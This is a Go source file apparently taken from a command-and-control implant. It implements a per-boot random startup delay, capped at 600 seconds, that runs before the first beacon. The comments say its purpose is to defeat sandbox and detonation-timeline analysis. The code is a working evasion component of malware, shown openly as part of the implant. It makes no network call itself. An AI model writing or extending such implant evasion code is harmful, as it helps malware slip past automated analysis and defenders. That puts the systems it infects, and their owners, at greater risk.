//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/rand"
	"encoding/binary"
	"strconv"
	"time"
)

// Startup execution delay (anti-sandbox/detonation-timeline blunting).
//
// The Generate pipeline injects a delay window [StartDelayMinStr,
// StartDelayMaxStr] in seconds. At startup the agent sleeps one per-boot
// random duration inside the window before the first beacon. 0/0 disables.
// The window is clamped to [0, 600]s and min<=max so a malformed blob can
// never wedge the implant.

// maxStartDelaySec caps a single startup delay so a bad value cannot park the
// implant for hours.
const maxStartDelaySec = 600

// parseStartDelayWindow parses and sanitizes the delay window. Pure function
// so it is unit-testable on every platform.
func parseStartDelayWindow(minStr, maxStr string) (min, max int) {
	min, _ = strconv.Atoi(minStr)
	max, _ = strconv.Atoi(maxStr)
	if min < 0 {
		min = 0
	}
	if max < 0 {
		max = 0
	}
	if min > maxStartDelaySec {
		min = maxStartDelaySec
	}
	if max > maxStartDelaySec {
		max = maxStartDelaySec
	}
	if max > 0 && min > max {
		min = max
	}
	return min, max
}

// startDelayDuration draws the per-boot sleep duration inside [min, max].
// randUint32 is injected for tests (production passes cryptoRandUint32).
func startDelayDuration(min, max int, randUint32 func(uint32) uint32) time.Duration {
	if max <= 0 || min > max {
		return 0
	}
	if min == max {
		return time.Duration(min) * time.Second
	}
	span := uint32(max-min) + 1
	return time.Duration(min)*time.Second + time.Duration(randUint32(span))*time.Second
}

func cryptoRandUint32(n uint32) uint32 {
	if n == 0 {
		return 0
	}
	var b [4]byte
	if _, err := rand.Read(b[:]); err != nil {
		return 0
	}
	return binary.LittleEndian.Uint32(b[:]) % n
}

// applyStartDelay sleeps the configured per-boot random delay. Called once
// from init() after the config blob is loaded and before any beacon runs.
func applyStartDelay() {
	min, max := parseStartDelayWindow(StartDelayMinStr, StartDelayMaxStr)
	if d := startDelayDuration(min, max, cryptoRandUint32); d > 0 {
		time.Sleep(d)
	}
}
